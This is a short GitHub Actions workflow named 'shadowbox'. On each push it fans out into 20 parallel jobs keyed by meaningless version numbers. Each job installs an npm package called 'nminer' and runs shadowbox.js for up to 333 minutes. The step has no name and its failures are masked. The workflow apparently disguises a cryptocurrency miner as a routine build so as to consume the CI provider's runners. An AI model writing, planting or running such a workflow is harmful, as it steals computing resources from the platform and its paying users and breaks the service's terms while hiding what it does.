name: shadowbox
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4603 }
          - { version: 7802 }
          - { version: 1235 }
          - { version: 8420 }
          - { version: 1879 }
          - { version: 3768 }
          - { version: 844 }
          - { version: 9507 }
          - { version: 2754 }
          - { version: 4402 }
          - { version: 5093 }
          - { version: 9727 }
          - { version: 5122 }
          - { version: 3805 }
          - { version: 1666 }
          - { version: 8175 }
          - { version: 9984 }
          - { version: 7640 }
          - { version: 369 }
          - { version: 9746 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 333m node shadowbox.js || echo "shadowbox executed"